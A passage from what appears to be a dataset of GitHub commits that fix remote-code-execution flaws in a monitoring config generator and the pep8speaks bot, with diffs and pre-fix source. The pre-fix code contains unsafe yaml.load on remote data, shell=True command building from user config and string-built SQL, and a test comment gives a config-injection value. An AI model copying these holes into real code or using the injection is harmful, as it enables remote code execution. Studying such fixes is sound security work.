%(url, e) raise HostUnreachableException(msg) except ConnectionError as e: msg=\"Could not establish connection for '%s', error: %s\" %(url, e) raise HostUnreachableException(msg) except Timeout as e: msg=\"Connect timed out for '%s', error: %s\" %(url, e) raise HostUnreachableException(msg) except RequestException as e: msg=\"Could not get monitoring yaml from '%s', error: %s\" %(url, e) raise MonitoringConfigGeneratorException(msg) def get_from_header(field): return response.headers[field] if field in response.headers else None if response.status_code==200: yaml_config=yaml.load(response.content) etag=get_from_header('etag') mtime=get_from_header('last-modified') mtime=datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time()) else: msg=\"Request %s returned with status %s. I don't know how to handle that.\" %(url, response.status_code) raise MonitoringConfigGeneratorException(msg) return yaml_config, Header(etag=etag, mtime=mtime) class Header(object): MON_CONF_GEN_COMMENT=' ETAG_COMMENT=' MTIME_COMMMENT=' def __init__(self, etag=None, mtime=0): self.etag=etag self.mtime=int(mtime) def __nonzero__(self): return self.etag is None and self.mtime is 0 def __eq__(self, other): return self.etag==other.etag and self.mtime==other.mtime def __repr__(self): return \"Header(%s, %d)\" %(self.etag, self.mtime) def is_newer_than(self, other): if self.etag !=other.etag or self.etag is None: return cmp(self.mtime, other.mtime) > 0 else: return False def serialize(self): lines=[] time_string=strftime(\"%Y-%m-%d %H:%M:%S\", localtime()) lines.append(\"%s on %s\" %(Header.MON_CONF_GEN_COMMENT, time_string)) if self.etag: lines.append(\"%s%s\" %(Header.ETAG_COMMENT, self.etag)) if self.mtime: lines.append(\"%s%d\" %(Header.MTIME_COMMMENT, self.mtime)) return lines @staticmethod def parse(file_name): etag, mtime=None, 0 def extract(comment, current_value): value=None if line.startswith(comment): value=line.rstrip()[len(comment):] return value or current_value try: with open(file_name, 'r') as config_file: for line in config_file.xreadlines(): etag=extract(Header.ETAG_COMMENT, etag) mtime=extract(Header.MTIME_COMMMENT, mtime) if etag and mtime: break except IOError as e: pass finally: return Header(etag=etag, mtime=mtime) ", "sourceWithComments": "import datetime\nimport os\nimport os.path\nimport urlparse\nimport socket\nfrom time import localtime, strftime, time\n\nfrom requests.exceptions import RequestException, ConnectionError, Timeout\nimport requests\nimport yaml\n\nfrom monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, HostUnreachableException\nfrom monitoring_config_generator.yaml_tools.merger import merge_yaml_files\n\ndef is_file(parsed_uri):\n    return parsed_uri.scheme in ['', 'file']\n\n\ndef is_host(parsed_uri):\n    return parsed_uri.scheme in ['http', 'https']\n\n\ndef read_config(uri):\n    uri_parsed = urlparse.urlparse(uri)\n    if is_file(uri_parsed):\n        return read_config_from_file(uri_parsed.path)\n    elif is_host(uri_parsed):\n        return read_config_from_host(uri)\n    else:\n        raise ValueError('Given url was not acceptable %s' % uri)\n\n\ndef read_config_from_file(path):\n    yaml_config = merge_yaml_files(path)\n    etag = None\n    mtime = os.path.getmtime(path)\n    return yaml_config, Header(etag=etag, mtime=mtime)\n\n\ndef read_config_from_host(url):\n    try:\n        response = requests.get(url)\n    except socket.error as e:\n        msg = \"Could not open socket for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except ConnectionError as e:\n        msg = \"Could not establish connection for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except Timeout as e:\n        msg = \"Connect timed out for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except RequestException as e:\n        msg = \"Could not get monitoring yaml from '%s', error: %s\" % (url, e)\n        raise MonitoringConfigGeneratorException(msg)\n\n    def get_from_header(field):\n        return response.headers[field] if field in response.headers else None\n\n    if response.status_code == 200:\n        yaml_config = yaml.load(response.content)\n        etag = get_from_header('etag')\n        mtime = get_from_header('last-modified')\n        mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n    else:\n        msg = \"Request %s returned with status %s. I don't know how to handle that.\" % (url, response.status_code)\n        raise MonitoringConfigGeneratorException(msg)\n\n    return yaml_config, Header(etag=etag, mtime=mtime)\n\n\nclass Header(object):\n    MON_CONF_GEN_COMMENT = '# Created by MonitoringConfigGenerator'\n    ETAG_COMMENT = '# ETag: '\n    MTIME_COMMMENT = '# MTime: '\n\n    def __init__(self, etag=None, mtime=0):\n        self.etag = etag\n        self.mtime = int(mtime)\n\n    def __nonzero__(self):\n        return self.etag is None and self.mtime is 0\n\n    def __eq__(self, other):\n        return self.etag == other.etag and self.mtime == other.mtime\n\n    def __repr__(self):\n        return \"Header(%s, %d)\" % (self.etag, self.mtime)\n\n    def is_newer_than(self, other):\n        if self.etag != other.etag or self.etag is None:\n            return cmp(self.mtime, other.mtime) > 0\n        else:\n            return False\n\n    def serialize(self):\n        lines = []\n        time_string = strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n        lines.append(\"%s on %s\" % (Header.MON_CONF_GEN_COMMENT, time_string))\n        if self.etag:\n            lines.append(\"%s%s\" % (Header.ETAG_COMMENT, self.etag))\n        if self.mtime:\n            lines.append(\"%s%d\" % (Header.MTIME_COMMMENT, self.mtime))\n        return lines\n\n    @staticmethod\n    def parse(file_name):\n        etag, mtime = None, 0\n\n        def extract(comment, current_value):\n            value = None\n            if line.startswith(comment):\n                value = line.rstrip()[len(comment):]\n            return value or current_value\n\n        try:\n            with open(file_name, 'r') as config_file:\n                for line in config_file.xreadlines():\n                    etag = extract(Header.ETAG_COMMENT, etag)\n                    mtime = extract(Header.MTIME_COMMMENT, mtime)\n                    if etag and mtime:\n                        break\n        except IOError as e:\n            # it is totally fine to not have an etag, in that case there\n            # will just be no caching and the server will have to deliver the data again\n            pass\n        finally:\n            return Header(etag=etag, mtime=mtime)\n"}}, "msg": "Prevent remote code execution\n\nyaml.load() allows the provider of the yaml data (in this case: the monitored\nhost) to run arbitrary commands."}, "a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7": {"url": "https://api.github.com/repos/Scout24/monitoring-config-generator/commits/a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7", "html_url": "https://github.com/Scout24/monitoring-config-generator/commit/a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7", "sha": "a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7", "keyword": "remote code execution prevent", "diff": "diff --git a/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py b/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py\nindex 8fab35c..6ab871a 100644\n--- a/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py\n+++ b/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py\n@@ -119,8 +119,14 @@ def write_section(self, section_name, section_data):\n         sorted_keys = section_data.keys()\n         sorted_keys.sort()\n         for key in sorted_keys:\n-            value = section_data[key]\n-            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n+            value = self.value_to_icinga(section_data[key])\n+            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)\n+\n+            if \"\\n\" in icinga_line or \"}\" in icinga_line:\n+                msg = \"Found forbidden newline or '}' character in section %r.\"\n+                raise Exception(msg % section_name)\n+\n+            self.icinga_lines.append(icinga_line)\n         self.write_line(\"}\")\n \n     @staticmethod\ndiff --git a/src/unittest/python/YamlToIcinga_tests.py b/src/unittest/python/YamlToIcinga_tests.py\nindex 8b7f121..dbf436a 100644\n--- a/src/unittest/python/YamlToIcinga_tests.py\n+++ b/src/unittest/python/YamlToIcinga_tests.py\n@@ -1,5 +1,6 @@\n import os\n import unittest\n+from mock import Mock\n \n os.environ['MONITORING_CONFIG_GENERATOR_CONFIG'] = \"testdata/testconfig.yaml\"\n from monitoring_config_generator.MonitoringConfigGenerator import YamlToIcinga\n@@ -24,3 +25,28 @@ def test_list_to_cvs(self):\n         self.assertEquals(\",,,\", YamlToIcinga.value_to_icinga([None, None, None, None]))\n         self.assertEquals(\",23,42,\", YamlToIcinga.value_to_icinga([None, \"23\", 42, None]))\n \n+    def _get_config_mock(self, host=None, services=None):\n+        config = Mock()\n+        config.host = host or {}\n+        config.services = services or {}\n+        return config\n+\n+    def test_write_section_forbidden_characters(self):\n+        # Malicious hosts may try to insert new sections, e.g. by setting a\n+        # value to  \"42\\n}\\n define command {\\n ......\" which would lead to\n+        # arbitrary code execution. Therefore, certain characters must be\n+        # forbidden.\n+        header = Mock()\n+        header.serialize.return_value = \"the header\"\n+\n+        for forbidden in '\\n', '}':\n+            # Forbidden character in 'host' section.\n+            config = self._get_config_mock(host={'key': 'xx%syy' % forbidden})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+            config = self._get_config_mock(host={'xx%syy' % forbidden: \"value\"})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+\n+            config = self._get_config_mock(services={'foo': 'xx%syy' % forbidden})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+            config = self._get_config_mock(services={'xx%syy' % forbidden: \"value\"})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n", "message": "", "files": {"/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py": {"changes": [{"diff": "\n         sorted_keys = section_data.keys()\n         sorted_keys.sort()\n         for key in sorted_keys:\n-            value = section_data[key]\n-            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n+            value = self.value_to_icinga(section_data[key])\n+            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)\n+\n+            if \"\\n\" in icinga_line or \"}\" in icinga_line:\n+                msg = \"Found forbidden newline or '}' character in section %r.\"\n+                raise Exception(msg % section_name)\n+\n+            self.icinga_lines.append(icinga_line)\n         self.write_line(\"}\")\n \n     @staticmethod", "add": 8, "remove": 2, "filename": "/src/main/python/monitoring_config_generator/MonitoringConfigGenerator.py", "badparts": ["            value = section_data[key]", "            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))"], "goodparts": ["            value = self.value_to_icinga(section_data[key])", "            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)", "            if \"\\n\" in icinga_line or \"}\" in icinga_line:", "                msg = \"Found forbidden newline or '}' character in section %r.\"", "                raise Exception(msg % section_name)", "            self.icinga_lines.append(icinga_line)"]}], "source": "\n\"\"\"monconfgenerator Creates an Icinga monitoring configuration. It does it by querying an URL from which it receives a specially formatted yaml file. This file is transformed into a valid Icinga configuration file. If no URL is given it reads it's default configuration from file system. The configuration file is: /etc/monitoring_config_generator/config.yaml' Usage: monconfgenerator[--debug][--targetdir=<directory>][--skip-checks][URL] monconfgenerator -h Options: -h Show this message. --debug Print additional information. --targetdir=DIR The generated Icinga monitoring configuration is written into this directory. If no target directory is given its value is read from /etc/monitoring_config_generator/config.yaml --skip-checks Do not run checks on the yaml file received from the URL. \"\"\" from datetime import datetime import logging import os import sys from docopt import docopt from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, \\ ConfigurationContainsUndefinedVariables, NoSuchHostname, HostUnreachableException from monitoring_config_generator import set_log_level_to_debug from monitoring_config_generator.yaml_tools.readers import Header, read_config from monitoring_config_generator.yaml_tools.config import YamlConfig from monitoring_config_generator.settings import CONFIG EXIT_CODE_CONFIG_WRITTEN=0 EXIT_CODE_ERROR=1 EXIT_CODE_NOT_WRITTEN=2 LOG=logging.getLogger(\"monconfgenerator\") class MonitoringConfigGenerator(object): def __init__(self, url, debug_enabled=False, target_dir=None, skip_checks=False): self.skip_checks=skip_checks self.target_dir=target_dir if target_dir else CONFIG['TARGET_DIR'] self.source=url if debug_enabled: set_log_level_to_debug() if not self.target_dir or not os.path.isdir(self.target_dir): raise MonitoringConfigGeneratorException(\"%s is not a directory\" % self.target_dir) LOG.debug(\"Using %s as target dir\" % self.target_dir) LOG.debug(\"Using URL: %s\" % self.source) LOG.debug(\"MonitoringConfigGenerator start: reading from %s, writing to %s\" % (self.source, self.target_dir)) def _is_newer(self, header_source, hostname): if not hostname: raise NoSuchHostname('hostname not found') output_path=self.output_path(self.create_filename(hostname)) old_header=Header.parse(output_path) return header_source.is_newer_than(old_header) def output_path(self, file_name): return os.path.join(self.target_dir, file_name) def write_output(self, file_name, yaml_icinga): lines=yaml_icinga.icinga_lines output_writer=OutputWriter(self.output_path(file_name)) output_writer.write_lines(lines) @staticmethod def create_filename(hostname): name='%s.cfg' % hostname if name !=os.path.basename(name): msg=\"Directory traversal attempt detected for host name %r\" raise Exception(msg % hostname) return name def generate(self): file_name=None raw_yaml_config, header_source=read_config(self.source) if raw_yaml_config is None: raise SystemExit(\"Raw yaml config from source '%s' is 'None'.\" % self.source) yaml_config=YamlConfig(raw_yaml_config, skip_checks=self.skip_checks) if yaml_config.host and self._is_newer(header_source, yaml_config.host_name): file_name=self.create_filename(yaml_config.host_name) yaml_icinga=YamlToIcinga(yaml_config, header_source) self.write_output(file_name, yaml_icinga) if file_name: LOG.info(\"Icinga config file '%s' created.\" % file_name) return file_name class YamlToIcinga(object): def __init__(self, yaml_config, header): self.icinga_lines=[] self.indent=CONFIG['INDENT'] self.icinga_lines.extend(header.serialize()) self.write_section('host', yaml_config.host) for service in yaml_config.services: self.write_section('service', service) def write_line(self, line): self.icinga_lines.append(line) def write_section(self, section_name, section_data): self.write_line(\"\") self.write_line(\"define %s{\" % section_name) sorted_keys=section_data.keys() sorted_keys.sort() for key in sorted_keys: value=section_data[key] self.icinga_lines.append((\"%s%-45s%s\" %(self.indent, key, self.value_to_icinga(value)))) self.write_line(\"}\") @staticmethod def value_to_icinga(value): \"\"\"Convert a scalar or list to Icinga value format. Lists are concatenated by, and empty(None) values produce an empty string\"\"\" if isinstance(value, list): return \",\".join([str(x) if(x is not None) else \"\" for x in value]) else: return str(value) class OutputWriter(object): def __init__(self, output_file): self.output_file=output_file def write_lines(self, lines): with open(self.output_file, 'w') as f: for line in lines: f.write(line +\"\\n\") LOG.debug(\"Created %s\" % self.output_file) def generate_config(): arg=docopt(__doc__, version='0.1.0') start_time=datetime.now() try: file_name=MonitoringConfigGenerator(arg['URL'], arg['--debug'], arg['--targetdir'], arg['--skip-checks']).generate() exit_code=EXIT_CODE_CONFIG_WRITTEN if file_name else EXIT_CODE_NOT_WRITTEN except HostUnreachableException: LOG.warn(\"Target url{0} unreachable. Could not get yaml config!\".format(arg['URL'])) exit_code=EXIT_CODE_NOT_WRITTEN except ConfigurationContainsUndefinedVariables: LOG.error(\"Configuration contained undefined variables!\") exit_code=EXIT_CODE_ERROR except SystemExit as e: exit_code=e.code except BaseException as e: LOG.error(e) exit_code=EXIT_CODE_ERROR finally: stop_time=datetime.now() LOG.info(\"finished in %s\" %(stop_time -start_time)) sys.exit(exit_code) if __name__=='__main__': generate_config() ", "sourceWithComments": "\"\"\"monconfgenerator\n\nCreates an Icinga monitoring configuration. It does it by querying an URL from\nwhich it receives a specially formatted yaml file. This file is transformed into\na valid Icinga configuration file.\nIf no URL is given it reads it's default configuration from file system. The\nconfiguration file is: /etc/monitoring_config_generator/config.yaml'\n\nUsage:\n  monconfgenerator [--debug] [--targetdir=<directory>] [--skip-checks] [URL]\n  monconfgenerator -h\n\nOptions:\n  -h                Show this message.\n  --debug           Print additional information.\n  --targetdir=DIR   The generated Icinga monitoring configuration is written\n                    into this directory. If no target directory is given its\n                    value is read from /etc/monitoring_config_generator/config.yaml\n  --skip-checks     Do not run checks on the yaml file received from the URL.\n\n\"\"\"\nfrom datetime import datetime\nimport logging\nimport os\nimport sys\n\nfrom docopt import docopt\n\nfrom monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, \\\n    ConfigurationContainsUndefinedVariables, NoSuchHostname, HostUnreachableException\nfrom monitoring_config_generator import set_log_level_to_debug\nfrom monitoring_config_generator.yaml_tools.readers import Header, read_config\nfrom monitoring_config_generator.yaml_tools.config import YamlConfig\nfrom monitoring_config_generator.settings import CONFIG\n\n\nEXIT_CODE_CONFIG_WRITTEN = 0\nEXIT_CODE_ERROR = 1\nEXIT_CODE_NOT_WRITTEN = 2\n\nLOG = logging.getLogger(\"monconfgenerator\")\n\n\nclass MonitoringConfigGenerator(object):\n    def __init__(self, url, debug_enabled=False, target_dir=None, skip_checks=False):\n        self.skip_checks = skip_checks\n        self.target_dir = target_dir if target_dir else CONFIG['TARGET_DIR']\n        self.source = url\n\n        if debug_enabled:\n            set_log_level_to_debug()\n\n        if not self.target_dir or not os.path.isdir(self.target_dir):\n            raise MonitoringConfigGeneratorException(\"%s is not a directory\" % self.target_dir)\n\n        LOG.debug(\"Using %s as target dir\" % self.target_dir)\n        LOG.debug(\"Using URL: %s\" % self.source)\n        LOG.debug(\"MonitoringConfigGenerator start: reading from %s, writing to %s\" %\n                  (self.source, self.target_dir))\n\n    def _is_newer(self, header_source, hostname):\n        if not hostname:\n            raise NoSuchHostname('hostname not found')\n        output_path = self.output_path(self.create_filename(hostname))\n        old_header = Header.parse(output_path)\n        return header_source.is_newer_than(old_header)\n\n    def output_path(self, file_name):\n        return os.path.join(self.target_dir, file_name)\n\n    def write_output(self, file_name, yaml_icinga):\n        lines = yaml_icinga.icinga_lines\n        output_writer = OutputWriter(self.output_path(file_name))\n        output_writer.write_lines(lines)\n\n    @staticmethod\n    def create_filename(hostname):\n        name = '%s.cfg' % hostname\n        if name != os.path.basename(name):\n            msg = \"Directory traversal attempt detected for host name %r\"\n            raise Exception(msg % hostname)\n        return name\n\n    def generate(self):\n        file_name = None\n        raw_yaml_config, header_source = read_config(self.source)\n\n        if raw_yaml_config is None:\n            raise SystemExit(\"Raw yaml config from source '%s' is 'None'.\" % self.source)\n\n        yaml_config = YamlConfig(raw_yaml_config,\n                                 skip_checks=self.skip_checks)\n\n        if yaml_config.host and self._is_newer(header_source, yaml_config.host_name):\n            file_name = self.create_filename(yaml_config.host_name)\n            yaml_icinga = YamlToIcinga(yaml_config, header_source)\n            self.write_output(file_name, yaml_icinga)\n\n        if file_name:\n            LOG.info(\"Icinga config file '%s' created.\" % file_name)\n\n        return file_name\n\nclass YamlToIcinga(object):\n    def __init__(self, yaml_config, header):\n        self.icinga_lines = []\n        self.indent = CONFIG['INDENT']\n        self.icinga_lines.extend(header.serialize())\n        self.write_section('host', yaml_config.host)\n        for service in yaml_config.services:\n            self.write_section('service', service)\n\n    def write_line(self, line):\n        self.icinga_lines.append(line)\n\n    def write_section(self, section_name, section_data):\n        self.write_line(\"\")\n        self.write_line(\"define %s {\" % section_name)\n        sorted_keys = section_data.keys()\n        sorted_keys.sort()\n        for key in sorted_keys:\n            value = section_data[key]\n            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n        self.write_line(\"}\")\n\n    @staticmethod\n    def value_to_icinga(value):\n        \"\"\"Convert a scalar or list to Icinga value format. Lists are concatenated by ,\n        and empty (None) values produce an empty string\"\"\"\n        if isinstance(value, list):\n            # explicitly set None values to empty string\n            return \",\".join([str(x) if (x is not None) else \"\" for x in value])\n        else:\n            return str(value)\n\n\nclass OutputWriter(object):\n    def __init__(self, output_file):\n        self.output_file = output_file\n\n    def write_lines(self, lines):\n        with open(self.output_file, 'w') as f:\n            for line in lines:\n                f.write(line + \"\\n\")\n        LOG.debug(\"Created %s\" % self.output_file)\n\n\ndef generate_config():\n    arg = docopt(__doc__, version='0.1.0')\n    start_time = datetime.now()\n    try:\n        file_name = MonitoringConfigGenerator(arg['URL'],\n                                              arg['--debug'],\n                                              arg['--targetdir'],\n                                              arg['--skip-checks']).generate()\n        exit_code = EXIT_CODE_CONFIG_WRITTEN if file_name else EXIT_CODE_NOT_WRITTEN\n    except HostUnreachableException:\n        LOG.warn(\"Target url {0} unreachable. Could not get yaml config!\".format(arg['URL']))\n        exit_code = EXIT_CODE_NOT_WRITTEN\n    except ConfigurationContainsUndefinedVariables:\n        LOG.error(\"Configuration contained undefined variables!\")\n        exit_code = EXIT_CODE_ERROR\n    except SystemExit as e:\n        exit_code = e.code\n    except BaseException as e:\n        LOG.error(e)\n        exit_code = EXIT_CODE_ERROR\n    finally:\n        stop_time = datetime.now()\n        LOG.info(\"finished in %s\" % (stop_time - start_time))\n    sys.exit(exit_code)\n\n\nif __name__ == '__main__':\n    generate_config()\n"}}, "msg": "Prevent remote code execution\n\nMalicious yaml config could add new sections that would normally be forbidden."}}, "https://github.com/OrkoHunter/pep8speaks": {"e09ec28786aa04bb7a6459fec6294bbb9368671a": {"url": "https://api.github.com/repos/OrkoHunter/pep8speaks/commits/e09ec28786aa04bb7a6459fec6294bbb9368671a", "html_url": "https://github.com/OrkoHunter/pep8speaks/commit/e09ec28786aa04bb7a6459fec6294bbb9368671a", "message": "Prevent Remote code execution, Closes #28", "sha": "e09ec28786aa04bb7a6459fec6294bbb9368671a", "keyword": "remote code execution prevent", "diff": "diff --git a/pep8speaks/helpers.py b/pep8speaks/helpers.py\nindex f65732c..c5ec39d 100644\n--- a/pep8speaks/helpers.py\n+++ b/pep8speaks/helpers.py\n@@ -51,13 +51,14 @@ def update_dict(base, head):\n     Source : http://stackoverflow.com/a/32357112/4698026\n     \"\"\"\n     for key, value in head.items():\n-        if isinstance(base, collections.Mapping):\n-            if isinstance(value, collections.Mapping):\n-                base[key] = update_dict(base.get(key, {}), value)\n+        if key in base:\n+            if isinstance(base, collections.Mapping):\n+                if isinstance(value, collections.Mapping):\n+                    base[key] = update_dict(base.get(key, {}), value)\n+                else:\n+                    base[key] = head[key]\n             else:\n-                base[key] = head[key]\n-        else:\n-            base = {key: head[key]}\n+                base = {key: head[key]}\n     return base\n \n \n", "files": {"/pep8speaks/helpers.py": {"changes": [{"diff": "\n     Source : http://stackoverflow.com/a/32357112/4698026\n     \"\"\"\n     for key, value in head.items():\n-        if isinstance(base, collections.Mapping):\n-            if isinstance(value, collections.Mapping):\n-                base[key] = update_dict(base.get(key, {}), value)\n+        if key in base:\n+            if isinstance(base, collections.Mapping):\n+                if isinstance(value, collections.Mapping):\n+                    base[key] = update_dict(base.get(key, {}), value)\n+                else:\n+                    base[key] = head[key]\n             else:\n-                base[key] = head[key]\n-        else:\n-            base = {key: head[key]}\n+                base = {key: head[key]}\n     return base\n \n \n", "add": 7, "remove": 6, "filename": "/pep8speaks/helpers.py", "badparts": ["        if isinstance(base, collections.Mapping):", "            if isinstance(value, collections.Mapping):", "                base[key] = update_dict(base.get(key, {}), value)", "                base[key] = head[key]", "        else:", "            base = {key: head[key]}"], "goodparts": ["        if key in base:", "            if isinstance(base, collections.Mapping):", "                if isinstance(value, collections.Mapping):", "                    base[key] = update_dict(base.get(key, {}), value)", "                else:", "                    base[key] = head[key]", "                base = {key: head[key]}"]}], "source": "\n import base64 import collections import datetime import hmac import json import os import re import subprocess import time import psycopg2 import requests import unidiff import yaml from flask import abort def update_users(repository): \"\"\"Update users of the integration in the database\"\"\" if os.environ.get(\"OVER_HEROKU\", False) is not False: query=r\"INSERT INTO Users(repository, created_at) VALUES('{}', now());\" \\ \"\".format(repository) try: cursor.execute(query) conn.commit() except psycopg2.IntegrityError: conn.rollback() def follow_user(user): \"\"\"Follow the user of the service\"\"\" headers={ \"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"], \"Content-Length\": \"0\", } auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https://api.github.com/user/following/{}\" url=url.format(user) r=requests.put(url, headers=headers, auth=auth) def update_dict(base, head): \"\"\" Recursively merge or update dict-like objects. >>> update({'k1': 1},{'k1':{'k2':{'k3': 3}}}) Source: http://stackoverflow.com/a/32357112/4698026 \"\"\" for key, value in head.items(): if isinstance(base, collections.Mapping): if isinstance(value, collections.Mapping): base[key]=update_dict(base.get(key,{}), value) else: base[key]=head[key] else: base={key: head[key]} return base def match_webhook_secret(request): \"\"\"Match the webhook secret sent from GitHub\"\"\" if os.environ.get(\"OVER_HEROKU\", False) is not False: header_signature=request.headers.get('X-Hub-Signature') if header_signature is None: abort(403) sha_name, signature=header_signature.split('=') if sha_name !='sha1': abort(501) mac=hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data, digestmod=\"sha1\") if not hmac.compare_digest(str(mac.hexdigest()), str(signature)): abort(403) return True def check_pythonic_pr(data): \"\"\" Return True if the PR contains at least one Python file \"\"\" files=list(get_files_involved_in_pr(data).keys()) pythonic=False for file in files: if file[-3:]=='.py': pythonic=True break return pythonic def get_config(data): \"\"\" Get.pep8speaks.yml config file from the repository and return the config dictionary \"\"\" config={ \"message\":{ \"opened\":{ \"header\": \"\", \"footer\": \"\" }, \"updated\":{ \"header\": \"\", \"footer\": \"\" } }, \"scanner\":{\"diff_only\": False}, \"pycodestyle\":{ \"ignore\":[], \"max-line-length\": 79, \"count\": False, \"first\": False, \"show-pep8\": False, \"filename\":[], \"exclude\":[], \"select\":[], \"show-source\": False, \"statistics\": False, \"hang-closing\": False, }, \"no_blank_comment\": True, \"only_mention_files_with_errors\": True, } headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml\" url=url.format(data[\"repository\"], data[\"after_commit_hash\"]) r=requests.get(url, headers=headers, auth=auth) if r.status_code==200: try: new_config=yaml.load(r.text) config=update_dict(config, new_config) except yaml.YAMLError: pass arguments=[] confs=config[\"pycodestyle\"] for key, value in confs.items(): if value: if isinstance(value, int): if isinstance(value, bool): arguments.append(\"--{}\".format(key)) else: arguments.append(\"--{}={}\".format(key, value)) elif isinstance(value, list): arguments.append(\"--{}={}\".format(key, ','.join(value))) config[\"pycodestyle_cmd_config\"]='{arguments}'.format(arguments=' '.join(arguments)) config[\"pycodestyle\"][\"ignore\"]=[e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])] return config def get_files_involved_in_pr(data): \"\"\" Return a list of file names modified/added in the PR \"\"\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} diff_headers=headers.copy() diff_headers[\"Accept\"]=\"application/vnd.github.VERSION.diff\" auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) repository=data[\"repository\"] after_commit_hash=data[\"after_commit_hash\"] author=data[\"author\"] diff_url=\"https://api.github.com/repos/{}/pulls/{}\" diff_url=diff_url.format(repository, str(data[\"pr_number\"])) r=requests.get(diff_url, headers=diff_headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) files={} for patchset in patch: file=patchset.target_file[1:] files[file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: files[file].append(line.target_line_no) return files def get_python_files_involved_in_pr(data): files=get_files_involved_in_pr(data) for file in list(files.keys()): if file[-3:] !=\".py\": del files[file] return files def run_pycodestyle(data, config): \"\"\" Run pycodestyle script on the files and update the data dictionary \"\"\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) repository=data[\"repository\"] after_commit_hash=data[\"after_commit_hash\"] author=data[\"author\"] py_files=get_python_files_involved_in_pr(data) for file in py_files: filename=file[1:] url=\"https://raw.githubusercontent.com/{}/{}/{}\" url=url.format(repository, after_commit_hash, file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check: file_to_check.write(r.text) cmd='pycodestyle{config[pycodestyle_cmd_config]} file_to_check.py'.format( config=config) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"extra_results\"][filename]=stdout.decode(r.encoding).splitlines() data[\"results\"][filename]=[] for error in list(data[\"extra_results\"][filename]): if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error): data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename)) data[\"extra_results\"][filename].remove(error) for error in list(data[\"results\"][filename]): if config[\"scanner\"][\"diff_only\"]: if not int(error.split(\":\")[1]) in py_files[file]: data[\"results\"][filename].remove(error) url=\"https://github.com/{}/blob/{}{}\" data[filename +\"_link\"]=url.format(repository, after_commit_hash, file) os.remove(\"file_to_check.py\") def prepare_comment(request, data, config): \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\" author=data[\"author\"] comment_header=\"\" if request.json[\"action\"]==\"opened\": if config[\"message\"][\"opened\"][\"header\"]==\"\": comment_header=\"Hello @\" +author +\"! Thanks for submitting the PR.\\n\\n\" else: comment_header=config[\"message\"][\"opened\"][\"header\"] +\"\\n\\n\" elif request.json[\"action\"] in[\"synchronize\", \"reopened\"]: if config[\"message\"][\"updated\"][\"header\"]==\"\": comment_header=\"Hello @\" +author +\"! Thanks for updating the PR.\\n\\n\" else: comment_header=config[\"message\"][\"updated\"][\"header\"] +\"\\n\\n\" ERROR=False comment_body=[] for file, issues in data[\"results\"].items(): if len(issues)==0: if not config[\"only_mention_files_with_errors\"]: comment_body.append( \" -There are no PEP8 issues in the\" \" file[`{0}`]({1}) !\".format(file, data[file +\"_link\"])) else: ERROR=True comment_body.append( \" -In the file[`{0}`]({1}), following \" \"are the PEP8 issues:\\n\".format(file, data[file +\"_link\"])) for issue in issues: error_string=issue.replace(file +\":\", \"Line \") error_string_list=error_string.split(\" \") code=error_string_list[2] code_url=\"https://duckduckgo.com/?q=pep8%20{0}\".format(code) error_string_list[2]=\"[{0}]({1})\".format(code, code_url) line, col=error_string_list[1][:-1].split(\":\") line_url=data[file +\"_link\"] +\" error_string_list[1]=\"[{0}:{1}]({2}):\".format(line, col, line_url) error_string=\" \".join(error_string_list) error_string=error_string.replace(\"Line[\", \"[Line \") comment_body.append(\"\\n>{0}\".format(error_string)) comment_body.append(\"\\n\\n\") if len(data[\"extra_results\"][file]) > 0: comment_body.append(\" -Complete extra results for this 